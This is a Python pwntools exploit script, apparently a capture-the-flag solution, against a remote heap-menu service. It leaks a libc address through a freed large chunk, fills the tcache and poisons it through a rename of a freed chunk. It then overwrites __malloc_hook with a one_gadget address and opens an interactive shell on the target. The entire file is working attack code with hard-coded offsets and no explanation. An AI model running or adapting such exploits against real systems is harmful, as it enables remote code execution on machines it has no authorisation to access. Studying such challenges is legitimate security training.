#!/usr/bin/env python3
from pwn import *
import sys

malloc_hook = 0x1EAB70
one_shots = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]

IP = sys.argv[1]
PORT = 17102

r = remote(IP, PORT)

def add_baby(age, size, data):
    r.sendline(b"1")
    r.recvuntil(": ")

    r.sendline(str(age).encode())
    r.recvuntil(": ")

    r.sendline(str(size).encode())
    r.recvuntil(": ")

    r.send(data)
    r.recvuntil("> ")

def rename_baby(idx, size, data):
    r.sendline(b"2")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    r.recvuntil(": ")

    r.sendline(str(size).encode())
    r.recvuntil(": ")

    r.send(data)
    r.recvuntil("> ")

def delete_baby(idx):
    r.sendline(b"3")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    r.recvuntil("> ")

def view_baby(idx):
    r.sendline(b"4")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    data = b''

    for _ in range(3):
        data += r.recvline()

    r.recvuntil(b"> ")
    return data

# make leak 
add_baby(0, 0x410, b"leak") # 0

add_baby(1, 0x40, b"aaaa") # 1
add_baby(2, 0x40, b"aaaa") # 2

# tcahce full
for i in range(3, 7+3):
    add_baby(i, 0x60, b"aaaa")

for i in range(3, 7+3):
    delete_baby(i)

# leak
delete_baby(0)
leak = u64(view_baby(0).split(b'\n')[1].split(b': ')[1].ljust(8, b'\x00'))
base = leak - 0x1eabe0

print("[+] leak: ", hex(leak))
print("[+] base: ", hex(base))

# tcache poisoning 
delete_baby(1)
delete_baby(2)
rename_baby(2, 0x40, p64(base + 0x1eab5d))

add_baby(0, 0x40, b"junk")
add_baby(0, 0x40, b"\x00"*19 + p64(base + one_shots[3]))

r.sendline(b"1")

r.interactive()
